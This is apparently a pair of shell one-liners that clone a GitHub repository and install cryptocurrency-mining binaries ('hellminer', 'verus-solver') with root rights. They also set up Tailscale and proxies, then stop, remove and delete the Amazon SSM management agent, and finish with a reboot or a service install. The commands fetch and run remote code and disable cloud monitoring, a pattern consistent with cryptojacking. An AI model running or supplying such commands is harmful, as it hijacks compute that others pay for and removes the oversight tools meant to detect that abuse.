git clone https://github.com/anuragkumar671998/vs-mn.git && cd vs-mn && chmod +x hellminer && chmod +x add-proxies.sh && chmod +x tailscale.sh && sudo ./tailscale.sh && chmod +x verus-solver && chmod +x service.sh && sudo sed -i 's/\r$//' add-proxies.sh && sudo ./add-proxies.sh && sudo snap stop amazon-ssm-agent && sudo snap remove amazon-ssm-agent && sudo rm -rf /var/snap/amazon-ssm-agent && sudo reboot


















git clone https://github.com/anuragkumar671998/vs-mn.git && cd vs-mn && chmod +x hellminer && chmod +x add-proxies.sh && chmod +x tailscale.sh && sudo ./tailscale.sh && chmod +x verus-solver && chmod +x service.sh && sudo snap stop amazon-ssm-agent && sudo snap remove amazon-ssm-agent && sudo rm -rf /var/snap/amazon-ssm-agent && sudo ./service.sh
